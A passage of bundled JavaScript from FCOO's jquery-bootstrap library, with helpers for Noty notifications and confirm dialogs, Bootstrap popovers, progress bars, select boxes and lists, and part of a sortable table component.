    $.bsNotyName = {
        info        : {da:'Information', en:'Information'},
        information : {da:'Information', en:'Information'},
        alert       : {da:'Bemærk', en:'Note'},
        success     : {da:'Succes', en:'Success'},
        error       : {da:'Fejl', en:'Error'},
        warning     : {da:'Advarsel', en:'Warning'},
        help        : {da:'Hjælp', en:'Help'}
    };



    /***************************************************************
    window.notyDefault
    Noty with default options as descried above
    ****************************************************************/
    function notyDefault( type, text, options = {}){
        options.type    = type;
        options.content = $._bsAdjustIconAndText( text );

        //Set killer
        if (options.queue && (options.killer !== false) && (options.killer !== true))
            options.killer = options.queue;

        //Set timeout
        if ( ((options.type == 'warning') || (options.type == 'success')) && !options.buttons && (!options.timeout || (options.timeout !== false)) )
            options.timeout = options.timeout || 3000;
        //REMOVED. See note in $.bsNoty. options.force = options.force || (options.timeout);

        //defaultHaeder
        options.defaultHeader = !options.header && (options.defaultHeader || ((options.type == 'error') && (options.defaultHeader !== false)));

        //text-align: center if no header
        options.textAlign = options.textAlign || (options.header || options.defaultHeader ? 'left' : 'center');

        //Set closeWith
        options.closeWith = options.closeWith || (options.buttons ? ['button'] : ['click']);

        return $.bsNoty( options );

    }

    /***************************************************************
    window.notySuccess / $.bsNotySuccess / window.notyOk / $.bsNotyOk
    Simple centered noty with centered text
    ****************************************************************/
    window.notySuccess = $.bsNotySuccess = window.notyOk = $.bsNotyOk = function( text, options = {}){
        return  notyDefault(
                    'success',
                    {icon: $.bsNotyIcon['success'], text: text},
                    $.extend( options, {layout: 'center'})
                );
    };

    /***************************************************************
    window.notyError / $.bsNotyError: Simple error noty with header
    ****************************************************************/
    window.notyError = $.bsNotyError = function( text, options ){
        return  notyDefault( 'error', text, options );
    };

    /***************************************************************
    window.notyWarning / $.bsNotyWarning: Simple warning noty with header
    ****************************************************************/
    window.notyWarning = $.bsNotyWarning = function( text, options ){
        return  notyDefault( 'warning', text, options );
    };

    /***************************************************************
    window.notyAlert / $.bsNotyAlert: Simple alert noty with header
    ****************************************************************/
    window.notyAlert = $.bsNotyAlert = function( text, options ){
        return  notyDefault( 'alert', text, options );
    };

    /***************************************************************
    window.notyInfo / $.bsNotyInfo: Simple info noty with header
    ****************************************************************/
    window.notyInfo = $.bsNotyInfo = function( text, options ){
        return  notyDefault( 'info', text, options );
    };

    /***************************************************************
    window.notyHelp / $.bsNotyHelp: Simple help noty with header
    ****************************************************************/
    window.notyHelp = $.bsNotyHelp = function( text, options ){
        return  notyDefault( 'help', text, options );
    };



    /******************************************************************************
    window.noty: Replacing window.noty from noty^2.4.1 that was removed in noty^3
    *******************************************************************************/
    window.noty = function( options ){
        return $.bsNoty($.extend({}, {
            content: options.text || options.content,
            show   : true
        }, options));
    };

    /********************************************************************
    *********************************************************************
    notyConfirm( text, onOk) or notyConfirm( options ) = Noty-variation of window.confirm = a Noty with OK and Cancel-buttons
    options = {
        type  : STRING, default = 'alert'
        header: OBJECT, default = ícon and name from $.bsNotyIcon and $.bsNotyName
        text  : The text shown
        onOk  : FUNCTION - called when the Ok-button is clicked
    }
    *********************************************************************
    *********************************************************************/
    window.notyConfirm = $.bsConfirm = function(){
        var options = arguments.length == 1 ? arguments[0] : {text: arguments[0], onOk: arguments[1]};

        options = $.extend({
            type         : 'info',
            defaultHeader: true,
            textAlign    : 'center',
            layout       : 'center',
            modal        : true,
            closeWith    : ['button'],
            buttons      : [
                {icon:'fa-times', text: {da:'Annullér', en:'Cancel'},          onClick: options.onCancel },
                {icon:'fa-check', text: {da:'Ok', en:'Ok'}, class:'min-width', onClick: options.onOk     }
            ]
        }, options);


        return window.noty( options );
    };


}(jQuery, this.Noty, this, document));
;
/****************************************************************************
	jquery-bootstrap-popover.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, bootstrap, window/*, document, undefined*/) {
	"use strict";

    /**********************************************************
    To sequre that all popovers are closed when the user click or
    tap outside the popover the following event are added
    **********************************************************/
    var popoverClassName        = 'has-popover',
        popoverCloseOnClick     = 'popover-close-on-click',
        no_popoverCloseOnClick  = 'no-' + popoverCloseOnClick;

    $.bsPopover_closeAll = function( checkFunc ){
        $('.'+popoverClassName).each(function () {
            var $this = $(this);
            if (!checkFunc || checkFunc($this))
                $this.popover('hide');
        });
    };


    $('body')
        .on("touchstart.jbs.popover mousedown.jbs.popover", function( event ){
            $.bsPopover_closeAll( function( $this ){
                // hide any open popover when the click is not inside the body of a popover
                return (!$this.is(event.target) && $this.has(event.target).length === 0 && $('.popover').has(event.target).length === 0);
            });
        })
        //Close all popover on esc
		.on('keydown', function( event ){
            if (event.altKey || event.ctrlKey || event.metaKey)
                return;
            if (event.keyCode === 27)
                $.bsPopover_closeAll();
        });


    /***********************************************************
	Extend bootstrap.Popover.prototype._getContentForTemplate
    to also include footer
	***********************************************************/
    bootstrap.Popover.prototype._getContentForTemplate = function( _getContentForTemplate ){
        return function(){
            var result =  _getContentForTemplate.apply(this, arguments);
            result['.popover-footer'] = this._config.footer;
            return result;
		};
	} (bootstrap.Popover.prototype._getContentForTemplate );


    /**********************************************************
    bsPopover( options ) - create a Bootstrap-popover
    options
        header      : See jquery-bootstrap-header.js
        close       : [Boolean] - show close cross in header
        trigger     : [String] 'click'	How popover is triggered - click | hover | focus | manual
        vertical    : [Boolean]
        closeOnClick: [Boolean] false - if true the popover will close when it is clicked
        placement   : [String] "top", "bottom", "left", "right". Default = 'right' for vertical: false and 'top' for vertical:true
        content     : The content (function, DOM-element, jQuery-object)
        footer      : {icon, text, link, title} or [] of {icon, text, link, title}
    **********************************************************/
    $.fn.bsPopover = function( options ){
        options =   $._bsAdjustOptions( options, {
                        baseClass   : 'popover',
                        useTouchSize: true,
                    });

        var $this = $(this),
            $header = '',
            $footer = '';

        //Add header (if any)
        if (options.header || options.close){
            options.icons = options.icons || {};
            options.headerClassName = 'popover-header-content';
            if (options.close)
                options.icons.close = {
                    onClick: function(){ $this.popover('hide'); }
                };

            $header =
                $('<div/>')
                    .addClass( no_popoverCloseOnClick )
                    ._bsHeaderAndIcons( options );
        }

        if (options.footer)
            $footer =
                $('<div/>')
                    .addClass( 'w-100 ' + no_popoverCloseOnClick )
                    ._bsAddHtml( options.footer );

        //If trigger == 'context' or 'contextmenu' use 'manual' and add event
        //In Bootstrap 5 'show' -> 'show' do not work => Need to keep track of state
        if ((options.trigger == 'context') || (options.trigger == 'contextmenu')){
            options.trigger = 'manual';
            this.on('show.bs.popover', function(){
                $this.popoverShown = true;
            });
            this.on('hide.bs.popover', function(){
                $this.popoverShown = false;
            });
            this.on('contextmenu.jbs.popover', function(){
                if (!$this.popoverShown)
                    $this.popover('show');
                return false;
            });
        }

        var popoverOptions = {
                trigger  :  options.trigger || 'click', //or 'hover' or 'focus' ORIGINAL='click'
                toggle   :  options.toggle || 'popover',
                html     :  true,
                placement:  options.placement || (options.vertical ? 'top' : 'right'),
                container:  'body',
                template :  '<div class="popover ' + $._bsGetSizeClass( options ) + ' ' + (options.closeOnClick ? popoverCloseOnClick : no_popoverCloseOnClick) + '" role="tooltip">'+
                                '<div class="popover-header"></div>' +
                                '<div class="popover-body"></div>' +
                                '<div class="popover-footer footer-content"></div>' +
                                '<div class="popover-arrow"></div>' +
                            '</div>',
                title    : $header,
                content  : options.content,
                footer   : $footer
            };
        if (options.delay)
            popoverOptions.delay = options.delay;

        return this.each(function() {
            var $this = $(this);

            $this.addClass( popoverClassName );

            //This event fires immediately when the show instance method is called.
            $this.on('show.bs.popover', popover_onShow );

            //This event is fired when the popover has been made visible to the user (will wait for CSS transitions to complete).
            $this.on('shown.bs.popover', popover_onShown );

            //This event is fired immediately when the hide instance method has been called.
            $this.on('hide.bs.popover', popover_onHide );

            //This event is fired when the popover has finished being hidden from the user (will wait for CSS transitions to complete).
            $this.on('hidden.bs.popover', popover_onHidden );

            $this.data('popover_options', options);

            $this.popover = new bootstrap.Popover($this, popoverOptions);

            if (options.postCreate)
              options.postCreate( options.content );

        });
    };

    function popover_onShow(){
        //If popover is opened by hover => close all other popover
        var $this = $(this),
            thisPopoverId = $this.attr('aria-describedby');

        if ($this.data('popover_options').trigger == 'hover')
            $.bsPopover_closeAll( function( $this2 ){
                return $this2.attr('aria-describedby') != thisPopoverId;
            });
    }

    function popover_onShown(){
        //Find the popover-element. It has id == aria-describedby
        var $this = $(this),
            popoverId = $this.attr('aria-describedby'),
            options = $this.data('popover_options'),
            popover = $this.data('bs.popover');

        this._$popover_element = popoverId ? $('#' + popoverId) : null;
        if (this._$popover_element){

            //Translate content and update if width changes
            var width = this._$popover_element.width();
            this._$popover_element.localize();
            if (width != this._$popover_element.width())
                $this.popover('update');

            //On click: Check if the popover needs to close.
            this._$popover_element.on('click.jbs.popover', function(event){
                //Find first element with class 'popover-close-on-click' or 'no-popover-close-on-click'
                var $elem = $(event.target);
                while ($elem.length){
                    if ($elem.hasClass(popoverCloseOnClick)){
                        $this.popover('hide');
                        break;
                    }
                    if ($elem.hasClass(no_popoverCloseOnClick))
                        break;
                    $elem = $elem.parent();
                }
            });

            //If the popover was opened by hover => prevent it from closing when hover the popover itself
            if (options.trigger == 'hover'){
                var _clearTimeout = function(){
                        //Stop the hide by timeout
                        if (popover._timeout){
                            window.clearTimeout(popover._timeout);
                            popover._timeout = 0;
                        }
                    };

                $this.on('mouseenter.jbs.popover', _clearTimeout );

                this._$popover_element.on('mouseenter.jbs.popover', _clearTimeout );

                this._$popover_element.on('mouseleave.jbs.popover', function(){
                    //If not delay is given => close popover
                    if (!popover.config.delay || !popover.config.delay.hide) {
                        popover.hide();
                        return;
                    }

                    //Else: Set timeout to close popover
                    popover._timeout = window.setTimeout(
                        function(){ popover.hide(); },
                        popover.config.delay.hide
                    );
                });
            }
        }
    }

    function popover_onHide(){
        $(this).off('mouseenter.jbs.popover');
        if (this._$popover_element)
            this._$popover_element.off('click.jbs.popover mousedown.jbs.popover mouseenter.jbs.popover mouseleave.jbs.popover');
    }

    function popover_onHidden(){
        //Reset this._$popover_element
        this._$popover_element = null;
    }


    //adjustItemOptionsForPopover - Adjust class-name for buttons/items in a popover
    function adjustItemOptionsForPopover(options, listId){
        var result = $.extend({}, options);
        $.each(options[listId], function(index, itemOptions){
            var closeOnClickClass = '';
            //If item has individuel clickOnClick => use it
            if ($.type(itemOptions.closeOnClick) == 'boolean')
                closeOnClickClass = itemOptions.closeOnClick ? popoverCloseOnClick : no_popoverCloseOnClick;
            else
                if (!itemOptions.id && !itemOptions.list)
                    closeOnClickClass = no_popoverCloseOnClick;

            itemOptions.class = itemOptions.class || '';
            itemOptions.class = (itemOptions.class ? itemOptions.class + ' ' : '') + closeOnClickClass;

            //Adjust child-list (if any)
            result[listId][index] = adjustItemOptionsForPopover(itemOptions, listId);
        });
        return result;
    }


    /**********************************************************
    bsButtonGroupPopover( options ) - create a Bootstrap-popover with buttons
    **********************************************************/
    $.fn.bsButtonGroupPopover = function( options, isSelectList ){

        //Setting bsButton.options.class based on bsPopover.options.closeOnClick
        if (!isSelectList){
            options = adjustItemOptionsForPopover(options, 'buttons');
            options.returnFromClick = true;
        }

        var $content = isSelectList ? $.bsSelectList( options ) : $.bsButtonGroup( options );
        if (isSelectList)
            this.data('popover_radiogroup', $content.data('selectlist_radiogroup') );

        return this.bsPopover( $.extend( options, { content:  $content }) );
    };


    /**********************************************************
    bsRadioButtonPopover( options ) - create a Bootstrap-popover with radio-buttons
    Default is closeOnClick = true
    **********************************************************/
    $.fn.bsSelectListPopover = function( options ){
        return this.bsButtonGroupPopover( $.extend(
                        { closeOnClick: true },
                        options,
                        {
                            postOnChange : $.proxy( selectListPopover_postOnChange, this ),
                            postCreate   : $.proxy( selectListPopover_postCreate, this ),
                        }), true );
    };

    function selectListPopover_postCreate( content ){
        //Update this with the selected items html
        $.proxy( selectListPopover_postOnChange, this )( content.children('.selected') );
    }

    function selectListPopover_postOnChange( $item ){
        var options = this.data('popover_options');
        if ($item && $item.length && options && options.syncHtml)
            //Update owner html to be equal to $item
            this.html( $item.html() );
    }

    /**********************************************************
    bsMenuPopover( options ) - create a Bootstrap-popover with a bsMenu
    **********************************************************/
    $.fn.bsMenuPopover = function( options ){
        options = adjustItemOptionsForPopover(options, 'list');

        options.content = $.bsMenu(options);
        this.data('popover_menu', options.content);

        return this.bsPopover( options );
    };



    $.fn.bsMenuPopover_getValues = function(){
        return this.data('popover_menu')._bsMenu_getValues();
    };

    $.fn.bsMenuPopover_setValues = function( values ){
        this.data('popover_menu')._bsMenu_setValues(values);
    };


}(jQuery, this.bootstrap, this, document));
;
/****************************************************************************
jquery-bootstrap-progress-bar.js
****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

/******************************************************************
bsProgressBar( options )
options
    width

<div class="progress">
  <div class="progress-bar" role="progressbar" aria-label="Example with label" style="width: 25%;" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100">25%</div>
</div>



*******************************************************************/
    var bsProgressBarId = 0;



    /**********************************************************
    bsProgressBar( options ) - create a Bootstrap progress-bar
    **********************************************************/
    $.bsProgressBar = $.bsProgressbar = function( options ){

        var id = options.id = options.id || 'bsProgressBar_' + bsProgressBarId++;

        this.options = options;

        var $result = $('<div/>')
                .attr('id', id)
                .addClass('progress')
                .data('pspb_value', 0)
                .width(options.width);

        $('<div/>')
            .addClass('progress-bar')
            .attr({
                'role': 'progressbar',
                'aria-valuenow': '0',
                'aria-valuemin': '0',
                'aria-valuemax': '100'
            })
            .width('0%')
            .appendTo($result);

        if (options.value)
            $result._pb_setValue(options.value);



        return $result;
    };

    //Extend $.fn with methods to set and get the state of bsCheckbox and to handle click
    $.fn.extend({
        _pb_setValue: function(value){
            this.find('.progress-bar')
                .css('width', value+'%').attr('aria-valuenow', value)
                .text(value > 10 ? value+'%' : '');
            this.data('pspb_value', value);
            return this;
        },
        _pb_incValue: function(value = 0){
            return this._pb_setValue( this.data('pspb_value') + value );
        }
    });


}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-select.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, i18next/*, window, document, undefined*/) {
	"use strict";


    /**********************************************************
    bsSelect
    Create a simple <select><option/>*N</select>
    The options can only contain text.
    To support language the text is stored with the <option> and used to update the text
    **********************************************************/
    i18next.on('languageChanged', function() {
        $('.jb-option').each( function( index, option ){
            setOptionText( $(option) );
        });
    });

    function setOptionText( $option ){
        var lang    = i18next.language,
            text    = $option.data('jb-text') || '';

        if (typeof text != 'string')
            text = text[lang] || text['eng'] || text['da'] || '';

        if ($option.prop("tagName") == 'option')
            $option.text( text );
        else
            $option.prop('label', text);
    }


    function bsSelect_onChange( event ){
        var $select = $(event.target),
            selectedIndex = $select.get(0).selectedIndex,
            options = $select.data('bsOptions'),
            selectedItem = options.optionList[selectedIndex];

        if (options.onChange)
            $.proxy(options.onChange, options.context)(selectedItem.id, true, $select);
    }

    var selectboxId = 0;
    $.bsSelect = $.bsSelectBox = $.bsSelectbox = function( options ){

        //options.items = options.items || options.list;
        options.list = options.list || options.items;

        options =
            $._bsAdjustOptions( options, {
                id          : '_bsSelectbox'+ selectboxId++,
                baseClass   : 'form-select',
                class       : 'form-control',
                useTouchSize: true,
            });

        //Create select-element
        var $select =
                $('<select/>')
                    ._bsAddBaseClassAndSize( options )
                    ._bsAddIdAndName( options );


        options.optionList = [];
        $.each( options.list, function( index, itemOptions ){
            var $option =
                    itemOptions.id ?
                    $('<option/>')
                        .val(itemOptions.id)
                        .prop('selected', itemOptions.id == options.selectedId) :
                    $('<optgroup/>');

            $option
                .addClass('jb-option')
                .addClass(itemOptions.textClass)
                .toggleClass('text-center', !!itemOptions.center)
                .data('jb-text', itemOptions.text)
                .appendTo($select);

            if (itemOptions.id)
                options.optionList.push( itemOptions );

            setOptionText( $option );
        });


        $select.data('bsOptions', options);
        $select.on('change', bsSelect_onChange);

        //wrap inside a label (if any)
        var $result = options.label ? $select._wrapLabel({ label: options.label }) : $select;

        $result.toggleClass('w-100', !!options.fullWidth);

        return $result;
    };

}(jQuery, this.i18next, this, document));
;
/****************************************************************************
	jquery-bootstrap-selectbutton.js,

    bsSelectButton( options ) - create a button that opens a modal with a selectlist

****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

    var selectButtonId = 0;
    $.bsSelectButton = $.bsSelectbutton = function( options ){

        options.id      = options.id || '_bsSelectButton'+ selectButtonId++,
        options.text    = options.text || {da:'Vælg...', en:'Select...'};
        options.onClick = $.fn._bsSelectButton_onClick;
        options.list    = options.list || options.items;
        options._class  = (options._class || '') + ' text-truncate btn-select';
        delete options.items;

        var $result = $.bsButton( options );

        options = $result.data('bsButton_options');
        options.context = $result,
        $result.data('bsButton_options', options);

        if (options.selectedId)
            $result._bsSelectButton_setValue(options.selectedId);

        return $result;
    };

    /**************************************************
    Methods for bsSelectButton
    **************************************************/
    $.fn._bsSelectButton_setValue = function( value ){
        var options = this.data('bsButton_options'),
            selectedItem;

        options.selectedId = value;
        this.data('bsButton_options', options);

        options.list.forEach( function(item){
            if (item.id == value)
                selectedItem = item;
        });

        if (selectedItem){
            this
                .empty()
                ._bsAddHtml(
                    $.extend(true,
                        {textClass: 'text-truncate'},
                        selectedItem
                    )
                );

            if (options.onChange)
                $.proxy(options.onChange, options.context)(value);
        }

        return this;
    };

    $.fn._bsSelectButton_getValue = function(){
        return this.data('bsButton_options').selectedId;
    };

    var $selectButton_Modal = null;
    $.fn._bsSelectButton_onClick = function( /*id, selected, $button*/ ){
        var options    = this.data('bsButton_options'),
            selectedId = options.selectedId,
            list       = $.extend(true, {}, options).list;

        list.forEach(function(item){
            item.selected = item.id ? item.id == selectedId : false;
        });

        $selectButton_Modal = $.bsModal({
            noHeader    : true,
            closeButton : false,
            clickable   : true,
            transparentBackground: true,
            scroll      : list.length > 5,
            content: {
                type         : 'selectlist',
                allowReselect: true,
                list         : list,
                onChange     : $.fn._bsSelectButton_onChange,
                context      : this,
                truncate     : true
            },
            show: true,
            removeOnClose: true
        });
    };

    /**************************************************
    **************************************************/
    $.fn._bsSelectButton_onChange = function( id ){
        this._bsSelectButton_setValue( id );
        if ($selectButton_Modal)
            $selectButton_Modal.close();
    };

}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-selectlist.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo


    bsSelectList( options ) - create a Bootstrap-list with selection

****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

    var selectlistId = 0;

    $.bsSelectList = $.bsSelectlist = function( options ){
        options =
            $._bsAdjustOptions( options, {
                id          : '_bsSelectlist'+ selectlistId++,
                baseClass   : 'select-list',
                class       : 'form-control dropdown-menu',
                useTouchSize: true
            });

        var $result =
                $('<div tabindex="0"/>')
                    ._bsAddIdAndName( options )
                    ._bsAddBaseClassAndSize( options ),
            radioGroup =
                $.radioGroup(
                    $.extend({}, options, {
                        radioGroupId     : options.id,
                        className        : 'active',
                        allowZeroSelected: false
                    })
                );

        $result.data('radioGroup', radioGroup);

        $.each( options.list, function( index, itemOptions ){
            var isItem = (itemOptions.id != undefined ),
                $item = $(isItem ? '<a/>' : '<div/>')
                            .addClass( isItem ? 'dropdown-item' : 'dropdown-header' )
                            .toggleClass( 'text-center',   !!options.center )
                            .toggleClass( 'text-truncate', !!options.truncate )
                            ._bsAddHtml( itemOptions, false, false, true )
                            .appendTo( $result );

            if (isItem)
                radioGroup.addElement( $item, itemOptions );
        });

        $result.data('selectlist_radiogroup', radioGroup);

        return $result;
    };

}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-table.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, i18next/*, window, document, undefined*/) {
	"use strict";

    // Create $.BSASMODAL - See src/jquery-bootstrap.js for details
    $.BSASMODAL = $.BSASMODAL || {};

/******************************************************************
bsTable( options )
options
    columns = [] of {
        id,
        header   :  {icon, text, link, textStyle} or [] of {text,...}
        vfFormat,
        vfOptions:  The content of a element can be set and updated using [jquery-value-format].
                    The options vfFormat and (optional) vfOptions defines witch format used to display the content

        align        : 'left','center','right'. Defalut = 'left'
        verticalAlign: 'top', 'middle','bottom'. Default = 'middle'
        noWrap       : false. If true the column will not be wrapped = fixed width
TODO:   truncate     : false. If true the column will be truncated. Normally only one column get truncate: true
        fixedWidth   : false. If true the column will not change width when the tables width is changed

        createContent : function(content, $td, sortBy) Create the content inside $td. Optional

        sortable           :  [boolean] false
        sortBy             : [string or function(e1, e2): int] "string". Possible values: "int" (sort as float), "moment", "moment_date", "moment_time" (sort as moment-obj) or function(e1, e2) return int
        sortIndex          : [int] null. When sorting and to values are equal the values from an other column is used.
                             The default order of the other columns to test is given by the its index in options.columns. Default sortIndex is (column-index+1)*100 (first column = 100). sortIndex can be set to alter the order.
        sortDefault        : [string or boolean]. false. Possible values = false, true, "asc" or "desc". true => "asc"
        updateAfterSorting : [boolean] false. If true and createContent is given the content of the coumun is updated after the tabel has been sorted
        getSortContent     : function(content) return the part of content to be used when sorting. optional
        sortHeader         : [boolean] false. If true a header-row is added every time the sorted value changes
        createHeaderContent: function(content, $span, sortBy) Create the content of a sort-group-heade insider $span. Optional

        filter       : function(rawValue, colunmOptions) null. Return true if row is included based on single value

    }

    showHeader          [boolean] true
    verticalBorder      [boolean] true. When true vertical borders are added together with default horizontal borders
    noBorder            [boolean] false. When true no borders are visible
    hoverRow            [boolean] true. When true the row get hightlightet when hovered
    noPadding           [boolean] false. When true the vertical padding of all cells are 0px

    notFullWidth        [boolean] false. When true the table is not 100% width and will adjust to it content
    centerInContainer   [boolean] false. When true the table is centered inside its container. Normaally it require notFullWidth: true

    selectable          [boolean] false
    selectedId          [string] "" id for selected row
    onChange            [function(id, selected, trElement)] null Called when a row is selected or unselected (if options.allowZeroSelected == true)
	allowZeroSelected   [boolean] false. If true it is allowed to un-select a selected row
    allowReselect       [Boolean] false. If true the onChange is called when a selected item is reselected/clicked

    defaultColunmOptions: {}. Any of the options for columns to be used as default values

    rowClassName      : [] of string. []. Class-names for each row

    rowFilter         : function(rowData, rowId) null. Return true if row is to be included/shown. rowData = {id: value}



    Sorting is done by https://github.com/joequery/Stupid-Table-Plugin


*******************************************************************/

    /********************************************************************
    Add different sort-functions for moment-objects: (a,b) return a-b and extend
    string-sort to accept content-object = {da,en} or {text:{da,en}}
    ********************************************************************/
    function momentSort(m1, m2, startOf){
        var moment1 = moment(m1),
            moment2 = moment(m2);

        if (startOf){
            moment1.startOf(startOf);
            moment2.startOf(startOf);
        }
        return moment1 - moment2;
    }

    $.extend( $.fn.stupidtable.default_sort_fns, {
        //'moment' = sort by moment
        'moment'     : momentSort,

        //'moment_date' - sort by date despide the time
        'moment_date': function (m1, m2){
            return momentSort(m1, m2, 'day');
        },

        //'moment_time' - sort by time despide ther date
        'moment_time': function (m1, m2){
            return momentSort(
                moment(m1).date(1).month(0).year(2000),
                moment(m2).date(1).month(0).year(2000)
            );
        },

        //Extend string-sort to include content-obj
        "string": function(a, b) {
            //Convert a and b to {text:...} and get only text-part
            a = $._bsAdjustIconAndText( a ).text;
            b = $._bsAdjustIconAndText( b ).text;

            //Translate a and b if they are {da,en}
            a = $.isPlainObject(a) ? i18next.sentence( a ) : a;
            b = $.isPlainObject(b) ? i18next.sentence( b ) : b;

            return a.toString().localeCompare(b.toString());
        },    });


    //Adjust default stupidtable-options (if any)
    $.extend( $.fn.stupidtable.default_settings, {

    });


    var defaultOptions = {
            baseClass           : 'table',
            styleClass          : 'fixed',
            showHeader          : true,
            verticalBorder      : true,
            noBorder            : false,
            hoverRow            : true,
            noPadding           : false,
            notFullWidth        : false,
            centerInContainer   : false,
            useTouchSize        : true,
            defaultColunmOptions: {},
            rowClassName        : [],

            stupidtable         : {}
        },

        defaultColunmOptions = {
            align               : 'left',
            verticalAlign       : 'middle',
            noWrap              : false,
            truncate            : false,
            fixedWidth          : false,
            sortBy              : 'string',
            sortable            : false,
            noHorizontalPadding : false,
            noVerticalPadding   : false
        },

        dataTableId = 'bsTable_options';

    //********************************************************************
    function adjustThOrTd( $element, columnOptions, addWidth ){
        $element
            ._bsAddStyleClasses( columnOptions.textStyle )
            .addClass('align-' + columnOptions.verticalAlign )
            ._bsAddStyleClasses( columnOptions.align )
            .toggleClass('text-nowrap', !!columnOptions.noWrap )
//TODO            .toggleClass('text-truncate', !!columnOptions.truncate )
            .toggleClass('px-0', !!columnOptions.noHorizontalPadding )
            .toggleClass('py-0', !!columnOptions.noVerticalPadding );

        if (addWidth && columnOptions.width)
            $element.css({
                'width'    : columnOptions.width,
                'max-width': columnOptions.width
            });

        return $element;
    }


    /**********************************************************
    asModal - display the table in a modal-window with fixed header and scrolling content
    **********************************************************/
    $.BSASMODAL.BSTABLE = function( modalOptions = {}){
        var showHeader = this.find('.no-header').length == 0,
            _this      = this,
            $result,
            count;

        if (showHeader){
            //Clone the header and place them in fixed-body of the modal. Hide the original header by padding the table
            //Add on-click on the clone to 'pass' the click to the original header
            this.$theadClone = this.find('thead').clone( true, false );

            this.$theadClone.find('th').on('click', function( event ){
                var columnIndex = $(event.delegateTarget).index();
                _this.sortBy( columnIndex );
            });

            this.$tableWithHeader =
                $('<table/>')
                    ._bsAddBaseClassAndSize( this.data(dataTableId) )
                    .addClass('table-with-header')
                    .append( this.$theadClone );
            this.$thead = this.find('thead');
            count  = 20;
        }

        $result = $.bsModal(
                        $.extend( modalOptions, {
                            flexWidth        : true,
                            noVerticalPadding: true,
                            content          : this,
                            fixedContent     : this.$tableWithHeader,
                            _fixedContentHasScrollClass: true,      //Internal options to have scroll-bar-margin on fixed content
                        })
                      );

        if (showHeader){
            //Using timeout to wait for the browser to update DOM and get height of the header
            var setHeaderHeight = function(){
                    var height = _this.$tableWithHeader.outerHeight();
                    if (height <= 0){
                        count--;
                        if (count){
                            //Using timeout to wait for the browser to update DOM and get height of the header
                            setTimeout( setHeaderHeight, 50 );
                            return;
                        }
                    }

                    _this.setHeaderWidthAndHeight();

                    //Only set header-height once
                    $result.off('shown.bs.modal.table', setHeaderHeight );
                };

            $result.on('shown.bs.modal.table', setHeaderHeight );
            this.$thead.resize( $.proxy(this.setHeaderWidthAndHeight, this) );
        }

        return $result;
    };

    /**********************************************************
    Prototype for bsTable
    **********************************************************/
    var bsTable_prototype = {
        /**********************************************************
        addRow( rowContent)  - add a new row to the table
        **********************************************************/
        addRow: function( rowContent ){
            var options = this.data(dataTableId),
                $tbody  = this.find('tbody').first(),
                $tr     = $('<tr/>').appendTo( $tbody );

            if (options.rowClassName.length){
                var rowIndex = $tbody.children('tr').length - 1;
                if (options.rowClassName.length > rowIndex)
                    $tr.addClass(options.rowClassName[rowIndex]);
            }

            if (options.selectable)
                $tr.attr('id', rowContent.id || 'rowId_'+rowId++);

            var _this = this;
            $.each( options.columns, function( index, columnOptions ){
                var content = rowContent[columnOptions.id],
                    $td = $('<td/>').appendTo($tr);
                adjustThOrTd( $td, columnOptions, !options.showHeader );

                if ($.isPlainObject(content) && content.className)
                    $td.addClass(content.className);

                //Save original contant as sort-by-value
                $td.data('sort-value', columnOptions.getSortContent ?  columnOptions.getSortContent(content) : content );
                //If raw-value and sort-value are differnt => also save raw-value
                if (columnOptions.getSortContent)
                    $td.data('raw-value', content );

                //Build the content using the createContent-function, _bsAppendContent, or jquery-value-format
                _this._createTdContent( content, $td, index );
            });

            //Add rows to radioGroup
            if (options.selectable)
                options.radioGroup.addElement( $tr );
        },

        /**********************************************************
        _getColumn - Return the column with id or index
        **********************************************************/
        _getColumn: function( idOrIndex ){
            return $.isNumeric(idOrIndex) ? this.columns[idOrIndex] : this.columnIds[idOrIndex];
        },

        /**********************************************************
        _createTdContent
        **********************************************************/
        _createTdContent: function( content, $td, columnIndex, createContent ){
            var columnOptions = this._getColumn(columnIndex);

            //Build the content using the given create-function, column.createContent-function, _bsAppendContent, or jquery-value-format
            var sortBy = this.lastSortBy.columnIndex == columnIndex ? this.lastSortBy.direction : false;
            if (createContent)
                createContent( content, $td, sortBy );
            else
                if (columnOptions.createContent)
                    columnOptions.createContent( content, $td, sortBy );
                    else
                        if (columnOptions.vfFormat)
                            $td.vfValueFormat( content, columnOptions.vfFormat, columnOptions.vfOptions );
                        else
                            $td._bsAppendContent( content );
        },

        /**********************************************************
        eachRow - Call rowFunc = function(rowOptions)  for all rows
        rowOptions = {
            id      : Row-id
            $tr     : tr-element
            $tdList : [] of td-elements

            valueList: [] of raw-value
            values   : {ID} of raw-value;

            sortValueList: [] of sort-value
            sortValues   : {ID} of sort-value;

            columns: All column of the table
        }
        **********************************************************/
        eachRow: function( rowFunc ){
            var _this = this;

            this.find('tbody tr').each( function( rowIndex, tr ){
                var $tr = $(tr),
                    id = $tr.attr('id'),
                    $tdList = [],
                    valueList = [],
                    values = {},
                    sortValueList = [],
                    sortValues = {};

                $tr.find('td').each(function(index, td){
                    var $td = $(td);
                    $tdList.push( $td );
                });

                //Find the "raw" content eq. before any display adjusting was made and the content used for sorting
                $.each($tdList, function( columnIndex, $td ){
                    var column    = _this._getColumn( columnIndex ),
                        sortValue = $td.data('sort-value'),
                        value     = column.getSortContent ? $td.data('raw-value') : sortValue;

                    valueList.push(value);
                    values[column.id] = value;

                    sortValueList.push(sortValue);
                    sortValues[column.id] = sortValue;

                });

                rowFunc({
                    id       : id,
                    $tr      : $tr,
                    $tdList  : $tdList,

                    valueList: valueList,
                    values   : values,

                    sortValueList: sortValueList,
                    sortValues   : sortValues,

                    columns: this.columns

                });
            });
            return this;
        },

        /**********************************************************
        setHeaderWidthAndHeight - Set the width of headers in the cloned table and adjust margin-top
        **********************************************************/
